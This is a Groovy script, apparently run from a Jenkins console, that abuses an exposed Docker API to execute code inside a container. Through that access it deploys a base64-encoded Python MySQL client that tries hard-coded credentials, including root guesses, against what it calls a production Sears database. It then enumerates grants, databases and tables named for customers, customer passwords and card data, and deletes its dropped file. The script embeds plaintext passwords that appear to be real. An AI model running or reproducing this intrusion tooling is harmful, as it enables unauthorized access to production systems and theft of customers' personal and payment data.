// Usar Python 2.7 en container RHEL para raw MySQL → PROD Sears 172.27.141.24:3308
import groovy.json.JsonOutput
import groovy.json.JsonSlurper

def dockerApi = "http://172.27.140.148:4243"
def containerId = "5b32e909c295"

def httpPost = { String urlStr, String jsonBody ->
  def conn = (HttpURLConnection) new URL(urlStr).openConnection()
  conn.setRequestMethod("POST")
  conn.setDoOutput(true)
  conn.setConnectTimeout(8000)
  conn.setReadTimeout(120000)
  conn.setRequestProperty("Content-Type", "application/json")
  if (jsonBody) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
  def code = conn.getResponseCode()
  def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
  conn.disconnect()
  return [code: code, body: body]
}

def execIn = { String cmd ->
  def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + JsonOutput.toJson(cmd) + ']}'
  def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
  if (r1.code != 201) return "EXEC_CREATE_FAIL HTTP ${r1.code}: ${r1.body}"
  def execId = new JsonSlurper().parseText(r1.body).Id
  def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
  return r2.body
}

// Python 2.7 script: raw MySQL native protocol client
def pyScript = '''
import socket, struct, hashlib, sys

def sha1(b): return hashlib.sha1(b).digest()

def mysql_auth(host, port, user, password, timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
    except Exception as e:
        return None, "CONN_ERR: " + str(e)
    
    def read_pkt():
        hdr = s.recv(4)
        if len(hdr) < 4: return None
        n = struct.unpack_from("<I", hdr + b"\\x00")[0] & 0xFFFFFF
        data = b""
        while len(data) < n:
            chunk = s.recv(n - len(data))
            if not chunk: break
            data += chunk
        return data
    
    def write_pkt(seq, data):
        n = len(data)
        s.sendall(struct.pack("<I", n)[:3] + chr(seq).encode() + data)
    
    # Server greeting
    p = read_pkt()
    if not p or ord(p[0:1]) != 10:
        return s, "BAD_PROTO"
    
    i = 1
    while p[i:i+1] != b"\\x00": i += 1
    i += 1
    i += 4
    salt1 = p[i:i+8]; i += 8
    i += 1; i += 2; i += 1; i += 2; i += 2
    alen = ord(p[i:i+1]); i += 1
    i += 10
    s2len = max(13, alen - 8)
    salt2 = p[i:i+s2len].rstrip(b"\\x00")
    salt = salt1 + salt2
    
    # Compute native password hash
    pw = password.encode("utf-8")
    h1 = sha1(pw); h2 = sha1(h1)
    h3 = sha1(salt + h2)
    token = bytes([h1[j] ^ h3[j] for j in range(20)])
    
    # Auth packet
    caps = 0x1 | 0x200 | 0x2000 | 0x8000 | 0x80000 | 0x20000
    auth = struct.pack("<I", caps) + b"\\x00\\x00\\x00\\x01\\x21" + b"\\x00" * 23
    auth += user.encode("utf-8") + b"\\x00"
    auth += chr(len(token)).encode() + token
    auth += b"mysql_native_password\\x00"
    
    write_pkt(1, auth)
    rsp = read_pkt()
    if not rsp: return s, "NO_RESPONSE"
    if ord(rsp[0:1]) == 0xFF:
        code = struct.unpack_from("<H", rsp[1:3])[0]
        msg = rsp[3:].decode("utf-8", errors="replace")
        return s, "ERR_%d: %s" % (code, msg)
    return s, "AUTH_OK"

def query(s, sql):
    n = len(sql) + 1
    pkt = b"\\x03" + sql.encode("utf-8")
    hdr = struct.pack("<I", n)[:3] + b"\\x00"
    s.sendall(hdr + pkt)
    
    def read_pkt2():
        hdr2 = s.recv(4)
        if len(hdr2) < 4: return None
        n2 = struct.unpack_from("<I", hdr2 + b"\\x00")[0] & 0xFFFFFF
        data = b""
        while len(data) < n2:
            chunk = s.recv(n2 - len(data))
            if not chunk: break
            data += chunk
        return data
    
    r = read_pkt2()
    if not r: return "NO_DATA"
    b0 = ord(r[0:1])
    if b0 == 0xFF:
        code = struct.unpack_from("<H", r[1:3])[0]
        return "ERR_%d: %s" % (code, r[3:].decode("utf-8", errors="replace"))
    if b0 == 0x00: return "OK"
    
    # Result set: decode column count
    def decode_lc(d, pos):
        b = ord(d[pos:pos+1]); pos += 1
        if b < 0xFB: return b, pos
        if b == 0xFC: v = struct.unpack_from("<H", d[pos:pos+2])[0]; pos += 2; return v, pos
        if b == 0xFD: v = struct.unpack_from("<I", d[pos:pos+4])[0] & 0xFFFFFF; pos += 3; return v, pos
        v = struct.unpack_from("<Q", d[pos:pos+8])[0]; pos += 8; return v, pos
    
    def read_lenstr(d, pos):
        b = ord(d[pos:pos+1]); pos += 1
        if b == 0xFB: return None, pos
        length, pos2 = decode_lc(d[pos-1:], 0)
        pos = pos - 1 + pos2
        val = d[pos:pos+length].decode("utf-8", errors="replace"); pos += length
        return val, pos
    
    col_count, _ = decode_lc(r, 0)
    cols = []
    for _ in range(col_count):
        cp = read_pkt2()
        if not cp: break
        pos = 0
        for _ in range(4): val, pos = read_lenstr(cp, pos)
        col_name, pos = read_lenstr(cp, pos)
        cols.append(col_name or "?")
    read_pkt2()  # EOF
    
    rows = []
    for _ in range(500):
        rp = read_pkt2()
        if not rp: break
        b0r = ord(rp[0:1])
        if b0r == 0xFE and len(rp) < 9: break
        pos = 0
        vals = []
        for _ in range(col_count):
            v, pos = read_lenstr(rp, pos)
            vals.append(str(v)[:150] if v else "NULL")
        rows.append(vals)
    
    out = "COLS[" + "|".join(cols) + "]\\n"
    for row in rows:
        out += "ROW[" + "|".join(row) + "]\\n"
    return out

# Targets: PROD Sears (172.27.141.24:3308) from container .23
targets = [
    ("172.27.141.24", 3308, "dbcronproductos", "0c1A0ZW0Kh#wjqdRHV$b63A"),
    ("172.27.141.24", 3308, "dbsmartinsight", "CD49uwg*iG9m5d+y"),
    ("172.27.141.24", 3308, "adaxxidb", "JTQ6PrkecY3y1kVN"),
    ("172.27.141.24", 3308, "root", "JenkisLegasy25"),
    ("172.27.141.24", 3308, "root", "auroraboreal00"),
    ("172.27.141.24", 3308, "root", ""),
    ("172.27.141.4", 3306, "app_t1", "wUt22Us2CUh#+M="),
    ("172.27.141.4", 3306, "app_t1", "jpTSf99UzLxC#t>"),
    ("172.27.141.4", 3310, "app_t1", "wUt22Us2CUh#+M="),
]

for (h, p, u, pw) in targets:
    print("\\n--- %s@%s:%d ---" % (u, h, p))
    s, status = mysql_auth(h, p, u, pw)
    print("STATUS: " + status)
    if status == "AUTH_OK" and s:
        print(query(s, "SHOW GRANTS FOR CURRENT_USER()"))
        print(query(s, "SHOW DATABASES"))
        for tbl in ["pedidos", "clientes", "clientescontrasena", "datostarjeta"]:
            print("COUNT(%s): %s" % (tbl, query(s, "SELECT COUNT(*) FROM " + tbl)))
        try: s.close()
        except: pass
    elif s:
        try: s.close()
        except: pass

print("\\n=== DONE ===")
'''

def pyB64 = pyScript.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo '${pyB64}' | base64 -d > /tmp/_mysql_probe.py && python2.7 /tmp/_mysql_probe.py 2>&1; rm -f /tmp/_mysql_probe.py"

println "=== DOCKER: Python2.7 MySQL → PROD Sears 172.27.141.24:3308 ==="
println execIn(cmd)
println "=== FIN DOCKER PY MYSQL ==="
